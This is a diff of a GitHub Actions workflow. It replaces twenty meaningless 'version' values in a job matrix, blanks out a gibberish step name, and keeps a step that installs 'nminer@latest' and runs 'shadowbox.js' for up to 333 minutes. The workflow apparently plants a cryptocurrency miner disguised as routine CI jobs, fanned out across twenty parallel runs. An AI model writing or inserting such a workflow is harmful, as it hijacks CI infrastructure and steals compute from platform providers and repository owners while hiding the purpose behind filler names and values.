@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7877 }
-          - { version: 8001 }
-          - { version: 4793 }
-          - { version: 8429 }
-          - { version: 1269 }
-          - { version: 8780 }
-          - { version: 960 }
-          - { version: 4808 }
-          - { version: 6096 }
-          - { version: 3628 }
-          - { version: 8033 }
-          - { version: 6420 }
-          - { version: 6079 }
-          - { version: 2685 }
-          - { version: 6421 }
-          - { version: 6648 }
-          - { version: 7627 }
-          - { version: 9235 }
-          - { version: 9771 }
-          - { version: 2812 }
+          - { version: 4603 }
+          - { version: 7802 }
+          - { version: 1235 }
+          - { version: 8420 }
+          - { version: 1879 }
+          - { version: 3768 }
+          - { version: 844 }
+          - { version: 9507 }
+          - { version: 2754 }
+          - { version: 4402 }
+          - { version: 5093 }
+          - { version: 9727 }
+          - { version: 5122 }
+          - { version: 3805 }
+          - { version: 1666 }
+          - { version: 8175 }
+          - { version: 9984 }
+          - { version: 7640 }
+          - { version: 369 }
+          - { version: 9746 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: promptly that institutionalize as
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 303m node shadowbox.js || echo "shadowbox executed"
+          timeout 333m node shadowbox.js || echo "shadowbox executed"
